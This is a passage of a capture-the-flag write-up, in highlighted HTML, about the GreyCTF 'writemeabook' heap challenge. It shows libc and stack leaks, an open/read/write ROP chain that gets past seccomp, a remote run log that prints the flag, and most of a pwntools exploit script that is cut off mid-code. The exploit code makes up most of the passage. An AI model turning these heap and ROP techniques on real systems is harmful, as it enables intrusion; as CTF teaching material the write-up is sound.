+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Option: &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+    <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>unpack(io<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>)<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> STDOUT
+
+<span style="color:#6272a4"># [...]</span>
+
+<span style="color:#6272a4"># libc leak</span>
+libc<span style="color:#ff79c6">.</span>address <span style="color:#ff79c6">=</span> libc_leak_free(<span style="color:#bd93f9">1</span>)
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;libc: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(libc<span style="color:#ff79c6">.</span>address)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</code></pre></div><h2 id="leaking-the-stack">Leaking the stack</h2>
+<p>Leaking the libc is cool but given the binary has a seccomp we cannot write one_gadgets on <code>__malloc_hook</code> or <code>__free_hook</code> or within the GOT (of the libc or of the binary) because of the seccomp. We have to do a ROPchain, to do so we could use <code>setcontext</code> but for this libc it is made around <code>rdx</code> that we do not control. Or we could simply leak <code>environ</code> to get the address of a stackframe from which we could return. That&rsquo;s what we gonna do on the <code>rewrite_books</code> stackframe.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#ff79c6">def</span> <span style="color:#50fa7b">leak_environ</span>(idx):
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Option: &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
+    io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+    <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>unpack(io<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>)<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+
+<span style="color:#6272a4"># leak stack (environ)</span>
+edit(<span style="color:#bd93f9">4</span>, pwn<span style="color:#ff79c6">.</span>flat([
+        <span style="color:#6272a4"># 1==</span>
+        <span style="color:#bd93f9">0xff</span>, <span style="color:#6272a4"># sz</span>
+        libc<span style="color:#ff79c6">.</span>sym<span style="color:#ff79c6">.</span>environ <span style="color:#6272a4"># target</span>
+    ], filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+
+environ <span style="color:#ff79c6">=</span> leak_environ(<span style="color:#bd93f9">1</span>)
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;environ: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(environ)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+stackframe_rewrite <span style="color:#ff79c6">=</span> environ <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">0x150</span>
+pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;stackframe_rewrite: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(stackframe_rewrite)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+</code></pre></div><h2 id="ropchain">ROPchain</h2>
+<p>Everything is ready for the ROPchain, we cannot use mprotect to use a shellcode within the seccomp forbids it. We just have to set the first entry to the stackframe we&rsquo;d like to hiijack and that&rsquo;s it, then we just need call edit on this entry and the ROPchain is written and triggered at the return of the function!</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py">rop <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ROP(libc, base<span style="color:#ff79c6">=</span>stackframe_rewrite)
+
+<span style="color:#6272a4"># setup the write to the rewrite stackframe</span>
+edit(<span style="color:#bd93f9">4</span>, pwn<span style="color:#ff79c6">.</span>flat([
+        <span style="color:#6272a4"># 1==</span>
+        <span style="color:#bd93f9">0xff</span>, <span style="color:#6272a4"># sz</span>
+        stackframe_rewrite <span style="color:#6272a4"># target</span>
+    ], filler <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+
+<span style="color:#6272a4"># ROPchain</span>
+rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_open, rdi<span style="color:#ff79c6">=</span>stackframe_rewrite <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">0xde</span> <span style="color:#ff79c6">+</span> <span style="color:#bd93f9">2</span>, rsi<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>O_RDONLY) <span style="color:#6272a4"># open</span>
+rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))
+rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_read, rdi<span style="color:#ff79c6">=</span><span style="color:#bd93f9">3</span>, rsi<span style="color:#ff79c6">=</span>heap_leak, rdx<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x100</span>) <span style="color:#6272a4"># file descriptor bf ...</span>
+rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))
+
+rop(rax<span style="color:#ff79c6">=</span>pwn<span style="color:#ff79c6">.</span>constants<span style="color:#ff79c6">.</span>SYS_write, rdi<span style="color:#ff79c6">=</span><span style="color:#bd93f9">1</span>, rsi<span style="color:#ff79c6">=</span>heap_leak, rdx<span style="color:#ff79c6">=</span><span style="color:#bd93f9">0x100</span>) <span style="color:#6272a4"># write</span>
+rop<span style="color:#ff79c6">.</span>call(rop<span style="color:#ff79c6">.</span>find_gadget([<span style="color:#f1fa8c">&#34;syscall&#34;</span>, <span style="color:#f1fa8c">&#34;ret&#34;</span>]))
+rop<span style="color:#ff79c6">.</span>exit(<span style="color:#bd93f9">0x1337</span>)
+rop<span style="color:#ff79c6">.</span>raw(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;/flag</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)
+
+<span style="color:#8be9fd;font-style:italic">print</span>(rop<span style="color:#ff79c6">.</span>dump())
+<span style="color:#8be9fd;font-style:italic">print</span>(<span style="color:#8be9fd;font-style:italic">hex</span>(<span style="color:#8be9fd;font-style:italic">len</span>(rop<span style="color:#ff79c6">.</span>chain()) <span style="color:#ff79c6">-</span> <span style="color:#bd93f9">8</span>))
+
+<span style="color:#6272a4"># write and trigger the ROPchain</span>
+edit(<span style="color:#bd93f9">1</span>, rop<span style="color:#ff79c6">.</span>chain())
+</code></pre></div><h2 id="profit">PROFIT</h2>
+<p>Finally:</p>
+<pre tabindex="0"><code>nasm@off:~/Documents/pwn/greycat/writemeabook/dist$ python3 exploit.py REMOTE HOST=34.124.157.94 PORT=12346
+[*] '/home/nasm/Documents/pwn/greycat/writemeabook/dist/chall'                                                                                                 
+    Arch:     amd64-64-little  
+    RELRO:    Partial RELRO
+    Stack:    Canary found                                                                                                                 
+    NX:       NX enabled
+    PIE:      No PIE (0x3fd000)                                                                                                                      
+    RUNPATH:  b'/home/nasm/Documents/pwn/greycat/writemeabook/dist'                                       
+[*] '/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6'                            
+    Arch:     amd64-64-little                                                                                   
+    RELRO:    Partial RELRO                                                                                                                
+    Stack:    Canary found                                                                                                                   
+    NX:       NX enabled                                                                                                                        
+    PIE:      PIE enabled                                                                                                                         
+[*] '/home/nasm/Documents/pwn/greycat/writemeabook/dist/ld-linux-x86-64.so.2' 
+    Arch:     amd64-64-little                                                                        
+    RELRO:    Partial RELRO                                                                                                                
+    Stack:    No canary found                                                                                                                
+    NX:       NX enabled                                                                                                                     
+    PIE:      PIE enabled                                                                                                                         
+[+] Opening connection to 34.124.157.94 on port 12346: Done                                                                               
+[+] heap: 0x81a000                                                                                          
+[*] Encrypted fp: 0x40484d
+[+] libc: 0x7f162182f000                                                                                                                           
+[+] environ: 0x7ffe60582c98
+[+] stackframe_rewrite: 0x7ffe60582b48
+[*] Loaded 218 cached gadgets for '/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6'
+0x7ffe60582b48:   0x7f1621874eb0 pop rax; ret                     
+0x7ffe60582b50:              0x2 SYS_open
+0x7ffe60582b58:   0x7f162185ae51 pop rsi; ret
+0x7ffe60582b60:              0x0 O_RDONLY
+0x7ffe60582b68:   0x7f16218593e5 pop rdi; ret
+0x7ffe60582b70:   0x7ffe60582c28 (+0xb8)
+0x7ffe60582b78:   0x7f16218c0396 syscall; ret
+0x7ffe60582b80:   0x7f16218bf528 pop rax; pop rdx; pop rbx; ret
+0x7ffe60582b88:              0x0 SYS_read
+0x7ffe60582b90:            0x100
+0x7ffe60582b98:      b'uaaavaaa' &lt;pad rbx&gt;
+0x7ffe60582ba0:   0x7f162185ae51 pop rsi; ret
+0x7ffe60582ba8:         0x81a000
+0x7ffe60582bb0:   0x7f16218593e5 pop rdi; ret
+0x7ffe60582bb8:              0x3
+0x7ffe60582bc0:   0x7f16218c0396 syscall; ret
+0x7ffe60582bc8:   0x7f16218bf528 pop rax; pop rdx; pop rbx; ret
+0x7ffe60582bd0:              0x1 SYS_write
+0x7ffe60582bd8:            0x100
+0x7ffe60582be0:      b'naaboaab' &lt;pad rbx&gt;
+0x7ffe60582be8:   0x7f162185ae51 pop rsi; ret
+0x7ffe60582bf0:         0x81a000
+0x7ffe60582bf8:   0x7f16218593e5 pop rdi; ret
+0x7ffe60582c00:              0x1
+0x7ffe60582c08:   0x7f16218c0396 syscall; ret
+0x7ffe60582c10:   0x7f16218593e5 pop rdi; ret
+0x7ffe60582c18:           0x1337 [arg0] rdi = 4919
+0x7ffe60582c20:   0x7f16218745f0 exit
+0x7ffe60582c28:     b'/flag\x00' b'/flag\x00'
+0xde
+[*] Switching to interactive mode
+Your book has been rewritten!
+
+grey{gr00m1ng_4nd_sc4nn1ng_th3_b00ks!!}
+\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb9\x81\x00\x00\x00\xb8\x81\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xb1\x81\x00\x00\x00\x00\x00\x00\x00\xc0\x81\x00\[*] Got EOF while reading in interactive
+$ exit
+$ 
+[*] Closed connection to 34.124.157.94 port 12346
+[*] Got EOF while sending in interactive
+</code></pre><h2 id="conclusion">Conclusion</h2>
+<p>That was a nice medium heap challenge, even though that was pretty classic. You can find the tasks and the exploit <a href="https://github.com/ret2school/ctf/tree/master/2023/greyctf/pwn/writemeabook">here</a>.</p>
+<h2 id="annexes">Annexes</h2>
+<p>Final exploit (with comments):</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-py" data-lang="py"><span style="color:#6272a4">#!/usr/bin/env python</span>
+<span style="color:#6272a4"># -*- coding: utf-8 -*-</span>
+
+<span style="color:#6272a4"># this exploit was generated via</span>
+<span style="color:#6272a4"># 1) pwntools</span>
+<span style="color:#6272a4"># 2) ctfmate</span>
+
+<span style="color:#ff79c6">import</span> os
+<span style="color:#ff79c6">import</span> time
+<span style="color:#ff79c6">import</span> pwn
+
+BINARY <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;chall&#34;</span>
+LIBC <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/home/nasm/Documents/pwn/greycat/writemeabook/dist/libc.so.6&#34;</span>
+LD <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;/home/nasm/Documents/pwn/greycat/writemeabook/dist/ld-linux-x86-64.so.2&#34;</span>
+
+<span style="color:#6272a4"># Set up pwntools for the correct architecture</span>
+exe <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>binary <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(BINARY)
+libc <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(LIBC)
+ld <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>ELF(LD)
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>terminal <span style="color:#ff79c6">=</span> [<span style="color:#f1fa8c">&#34;tmux&#34;</span>, <span style="color:#f1fa8c">&#34;splitw&#34;</span>, <span style="color:#f1fa8c">&#34;-h&#34;</span>]
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>delete_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">True</span>
+pwn<span style="color:#ff79c6">.</span>context<span style="color:#ff79c6">.</span>rename_corefiles <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">False</span>
+p64 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p64
+u64 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u64
+p32 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p32
+u32 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u32
+p16 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p16
+u16 <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u16
+p8  <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>p8
+u8  <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>u8
+
+host <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>HOST <span style="color:#ff79c6">or</span> <span style="color:#f1fa8c">&#39;127.0.0.1&#39;</span>
+port <span style="color:#ff79c6">=</span> <span style="color:#8be9fd;font-style:italic">int</span>(pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>PORT <span style="color:#ff79c6">or</span> <span style="color:#bd93f9">1337</span>)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">local</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Execute the target binary locally&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>debug([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, gdbscript<span style="color:#ff79c6">=</span>gdbscript, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>process([exe<span style="color:#ff79c6">.</span>path] <span style="color:#ff79c6">+</span> argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">remote</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Connect to the process on the remote host&#39;&#39;&#39;</span>
+    io <span style="color:#ff79c6">=</span> pwn<span style="color:#ff79c6">.</span>connect(host, port)
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>GDB:
+        pwn<span style="color:#ff79c6">.</span>gdb<span style="color:#ff79c6">.</span>attach(io, gdbscript<span style="color:#ff79c6">=</span>gdbscript)
+    <span style="color:#ff79c6">return</span> io
+
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">start</span>(argv<span style="color:#ff79c6">=</span>[], <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw):
+    <span style="color:#f1fa8c">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
+    <span style="color:#ff79c6">if</span> pwn<span style="color:#ff79c6">.</span>args<span style="color:#ff79c6">.</span>LOCAL:
+        <span style="color:#ff79c6">return</span> local(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+    <span style="color:#ff79c6">else</span>:
+        <span style="color:#ff79c6">return</span> remote(argv, <span style="color:#ff79c6">*</span>a, <span style="color:#ff79c6">**</span>kw)
+
+
+gdbscript <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39;&#39;&#39;
+</span><span style="color:#f1fa8c">source /home/nasm/Downloads/pwndbg/gdbinit.py
+</span><span style="color:#f1fa8c">&#39;&#39;&#39;</span><span style="color:#ff79c6">.</span>format(<span style="color:#ff79c6">**</span><span style="color:#8be9fd;font-style:italic">locals</span>())
+
+HEAP_OFFT <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x3d10</span>
+CHUNK3_OFFT <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x3d50</span>
+STDOUT <span style="color:#ff79c6">=</span> <span style="color:#bd93f9">0x21a780</span>
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">encode_ptr</span>(heap, offt, value):
+    <span style="color:#ff79c6">return</span> ((heap <span style="color:#ff79c6">+</span> offt) <span style="color:#ff79c6">&gt;&gt;</span> <span style="color:#bd93f9">12</span>) <span style="color:#ff79c6">^</span> value
+
+<span style="color:#ff79c6">import</span> subprocess
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">one_gadget</span>(filename):
+  <span style="color:#ff79c6">return</span> [<span style="color:#8be9fd;font-style:italic">int</span>(i) <span style="color:#ff79c6">for</span> i <span style="color:#ff79c6">in</span> subprocess<span style="color:#ff79c6">.</span>check_output([<span style="color:#f1fa8c">&#39;one_gadget&#39;</span>, <span style="color:#f1fa8c">&#39;--raw&#39;</span>, filename])<span style="color:#ff79c6">.</span>decode()<span style="color:#ff79c6">.</span>split(<span style="color:#f1fa8c">&#39; &#39;</span>)]
+
+<span style="color:#ff79c6">def</span> <span style="color:#50fa7b">exp</span>():
+
+    io <span style="color:#ff79c6">=</span> start()
+
+    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">init</span>(flip):
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&gt; &#34;</span>, flip)
+    
+    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">add</span>(idx, data: <span style="color:#8be9fd;font-style:italic">bytes</span>):
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Option: &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1&#34;</span>)
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Write me a book no more than 32 characters long!</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, data)
+
+    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">edit</span>(idx, data):
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Option: &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;2&#34;</span>)
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Write me the new contents of your book that is no longer than what it was before.</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, data)
+
+    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">free</span>(idx):
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Option: &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+
+    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">heapLeak</span>(idx):
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Option: &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;1337&#34;</span>)
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;What is your favourite number? &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+        io<span style="color:#ff79c6">.</span>recvuntil(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;You found a secret message: &#34;</span>)
+        <span style="color:#ff79c6">return</span> <span style="color:#8be9fd;font-style:italic">int</span>(io<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>)<span style="color:#ff79c6">.</span>decode(), <span style="color:#bd93f9">16</span>) <span style="color:#ff79c6">-</span> HEAP_OFFT
+
+    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">enable_print</span>(idx):
+        edit(idx, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join([
+            pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>)
+        ]))
+
+    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">libc_leak_free</span>(idx):
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Option: &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>unpack(io<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>)<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>)) <span style="color:#ff79c6">-</span> STDOUT
+
+    <span style="color:#ff79c6">def</span> <span style="color:#50fa7b">leak_environ</span>(idx):
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Option: &#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;3&#34;</span>)
+        io<span style="color:#ff79c6">.</span>sendlineafter(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;Index: &#34;</span>, <span style="color:#8be9fd;font-style:italic">str</span>(idx)<span style="color:#ff79c6">.</span>encode())
+        <span style="color:#ff79c6">return</span> pwn<span style="color:#ff79c6">.</span>unpack(io<span style="color:#ff79c6">.</span>recvline()<span style="color:#ff79c6">.</span>replace(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\n</span><span style="color:#f1fa8c">&#34;</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>)<span style="color:#ff79c6">.</span>ljust(<span style="color:#bd93f9">8</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;</span><span style="color:#f1fa8c">\x00</span><span style="color:#f1fa8c">&#34;</span>))
+
+    init(<span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;m&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">4</span> <span style="color:#ff79c6">+</span> pwn<span style="color:#ff79c6">.</span>p8(<span style="color:#bd93f9">0x41</span>))
+
+    add(<span style="color:#bd93f9">1</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;K&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x10</span>)
+    heap_leak <span style="color:#ff79c6">=</span> heapLeak(<span style="color:#bd93f9">1</span>)
+    pwn<span style="color:#ff79c6">.</span>log<span style="color:#ff79c6">.</span>success(<span style="color:#f1fa8c">f</span><span style="color:#f1fa8c">&#34;heap: </span><span style="color:#f1fa8c">{</span><span style="color:#8be9fd;font-style:italic">hex</span>(heap_leak)<span style="color:#f1fa8c">}</span><span style="color:#f1fa8c">&#34;</span>)
+
+    <span style="color:#6272a4"># victim</span>
+    add(<span style="color:#bd93f9">2</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span>)
+    add(<span style="color:#bd93f9">3</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join([   <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x10</span>,
+                        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>), <span style="color:#6272a4"># prev_sz</span>
+                        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0x21</span>) <span style="color:#6272a4"># fake size</span>
+                    ]))
+    
+    add(<span style="color:#bd93f9">4</span>, <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;&#34;</span><span style="color:#ff79c6">.</span>join([   <span style="color:#f1fa8c">b</span><span style="color:#f1fa8c">&#34;A&#34;</span><span style="color:#ff79c6">*</span><span style="color:#bd93f9">0x10</span>,
+                        pwn<span style="color:#ff79c6">.</span>p64(<span style="color:#bd93f9">0</span>), <span style="color:#6272a4"># prev_sz</span>
